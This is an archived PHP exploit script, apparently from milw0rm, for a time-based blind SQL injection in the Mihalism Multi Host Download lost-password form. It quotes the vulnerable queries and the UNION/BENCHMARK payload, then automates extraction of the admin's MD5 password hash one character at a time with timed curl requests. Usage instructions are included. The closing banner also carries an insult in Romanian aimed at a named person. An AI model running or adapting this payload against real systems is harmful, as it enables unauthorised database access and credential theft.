<html><head><title>Mihalism Multi Host Download (Username) Blind SQL Injection Exploit</title></head><pre>&lt;?php

/*
###############################################################################
#                                                                             
# Moubik ( Romanian Security Team - http://rstzone.org ) presents             
#                                                                             
# Mihalism Multi Host Download - Blind SQL Injection Attack                   
#                                                                              
# Thanks to Vladii for telling me about the CMS.                              
# Thanks to Shocker for telling Vladii about the CMS.                         
#                                                                             
#                                                                             
# Shoutz to Kw3rln, Bankai, Slick, Nemessis                                   
# Visit http://rstzone.org                                                    
# Visit http://websecurity.ro                                                 
#                                                                             
# Ride as high as possible                                                    
#                                                                             
#                                                                             
# Vulnerable Code is everywhere.                                              
# I'll talk about users.php                                                   
#                                                                             
###############################################################################* 

We have the code 

Line 107:
$DB-&gt;query(&quot;SELECT * FROM `&quot;.SQL_USERS_TABLE.&quot;` WHERE `user_name` = '&quot;.$_POST['user_name'].&quot;'&quot;);

Line 112:
$DB-&gt;query(&quot;INSERT INTO `&quot;.SQL_USERS_TABLE.&quot;` VALUES('', '&quot;.$_POST['user_name'].&quot;', '&quot;.md5($_POST['user_pass_1']).&quot;', '', '&quot;.$_SERVER['REMOTE_ADDR'].&quot;', '&quot;.$_POST['user_email'].&quot;', '&quot;.$_POST['private'].&quot;', '&quot;.time().&quot;', 'NORMAL', '&quot;.$_POST['country'].&quot;', '&quot;.$dob.&quot;', '&quot;.$_POST['gender'].&quot;')&quot;);

............

I'll create the query for lost password.
Click &quot;Lost Password&quot; and enter the SQL Injection in Username. The email address you could just leave it empty

Injection:
' UNION SELECT IF ( SUBSTRING(password,1,1) = '1', BENCHMARK(2000000, ENCODE('a','b')), 1 ),2,3,4,5,6,7,8,9,10,11,12 from mmh_user_data where user_id='1

The password is saved in hashed form so you only search for 0..9, a..f and you have the admin's hash

This vulnerable code is:
$DB-&gt;query(&quot;SELECT * FROM `&quot;.SQL_USERS_TABLE.&quot;` WHERE `user_name` = '{$_POST['username']}'&quot;);

So the query becomes:
SELECT * FROM `mmh_user_data` WHERE `user_name` = '' UNION SELECT IF ( SUBSTRING(password,1,1) = '1', BENCHMARK(20000000, ENCODE('a','b')), 1 )
,2,3,4,5,6,7,8,9,10,11,12 from mmh_user_data where user_id='1'

Delay-ing the response if the first character of the admin's hash is equal to '1'

*/

function goto_help()
{
	echo &quot;-----------------------------------------------------------------------------------------\n&quot;;
	echo &quot;* Usage php &quot;. $argv[0] .&quot; [full_link] [userid] \n&quot;;
	echo &quot;* example:\n&quot;;
	echo &quot;* php &quot;. $argv[0] .&quot; http://localhost/multihost/users.php?act=lost_password_go 1 \n&quot;;
	echo &quot;-----------------------------------------------------------------------------------------\n&quot;;
	exit();
}


$chars = array('0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '0', 'a', 'b', 'c', 'd', 'e', 'f');

$host = $argv[1];
$userid = (empty($argv[2]) == true ? 1 : $argv[2]);

if (empty ($argv[1]))
{
	goto_help();
}

echo &quot;---------------------------------------------------\n&quot;;
echo &quot;Starting to exploit $host\n&quot;;
echo &quot;Userid exploited is $userid\n&quot;;
echo &quot;---------------------------------------------------\n&quot;;

$hash = &quot;&quot;;

$conn = curl_init();
curl_setopt($conn, CURLOPT_POST, true);
curl_setopt($conn, CURLOPT_URL, $host);
curl_setopt($conn, CURLOPT_RETURNTRANSFER, true);

for ($length = 1 ; $length &lt;= 32 ; $length++)
{
	for ($char = 0 ; $char &lt;= 16 ; $char++)
	{
		$query = &quot;' UNION SELECT IF ( SUBSTRING(password,&quot;. $length .&quot;,1) = '&quot;. $chars[$char] .&quot;', BENCHMARK(20000000, ENCODE('a','b')), 1 ),2,3,4,5,6,7,8,9,10,11,12 from mmh_user_data where user_id='&quot;. $userid;
		//echo $query  .&quot;\n&quot;;
		$start = time(); $end = $start;
		curl_setopt($conn, CURLOPT_POSTFIELDS, 'username='. urlencode($query) .'&amp;user_email=1');
		curl_exec( $conn );
		$end = time();
		
		//if we have a hit
		if (($end - $start) &gt; 5) 
		{
			echo &quot;possible hit for &quot;. $chars[$char] .&quot;\n&quot;;
			$hash .= $chars[$char];
			break;
		}
		else
		{
			echo $chars[$char]. &quot; &quot;;
		}
	}
}


echo &quot;---------------------------------------------------\n&quot;;
echo &quot;* Exploit made by Moubik\n&quot;;
echo &quot;* Romanian Security Zone - http://rstzone.org/\n&quot;;
echo &quot;* esc6 esti un retardat\n&quot;;
echo &quot;---------------------------------------------------\n&quot;;
echo &quot;* Hash found for userid=&quot;. $userid . &quot;\n&quot;;
echo &quot;* hash=&quot;. $hash . &quot;\n&quot;;
echo &quot;---------------------------------------------------\n&quot;;


?&gt;

# milw0rm.com [2008-02-06]</pre></html>